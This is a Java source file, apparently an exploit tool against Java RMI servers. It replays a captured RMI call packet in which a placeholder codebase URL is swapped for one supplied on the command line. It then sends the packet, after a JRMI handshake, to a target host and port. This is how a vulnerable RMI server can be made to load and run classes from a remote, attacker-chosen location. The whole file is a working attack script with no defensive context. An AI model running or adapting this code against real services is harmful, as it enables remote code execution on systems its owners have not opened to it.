package rmi;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.Socket;

public class RMIReplaySender {

	// http://download.oracle.com/javase/1.3/docs/guide/rmi/spec/rmi-protocol.html

	public static void main(String[] args) throws Exception {
		File rmipacket = new File("build/rmipacket");
		System.out.println(rmipacket.length());
		DataInputStream in = new DataInputStream(new FileInputStream(rmipacket));
		byte[] packetBytes = new byte[(int)rmipacket.length()];
		in.readFully(packetBytes);
		in.close();

		String url = args[0];
		String dummyURL = "file:./rmidummy.jar";

		String packetStr = new String(packetBytes, "ISO-8859-1");
		int pos = packetStr.indexOf((char)0+""+(char)dummyURL.length() + dummyURL);
		packetStr = packetStr.substring(0, pos+1) + (char)url.length() + url + packetStr.substring(pos + 2 + dummyURL.length());
		packetBytes = packetStr.getBytes("ISO-8859-1");
		
		Socket s = new Socket(args[1],Integer.parseInt(args[2]));
		OutputStream out = s.getOutputStream();
		out.write("JRMI\0\2K\0\0\0\0\0\0".getBytes("ISO-8859-1"));
		out.write(packetBytes);
		out.flush();	
		Thread.sleep(500);
		s.close();
	}
}
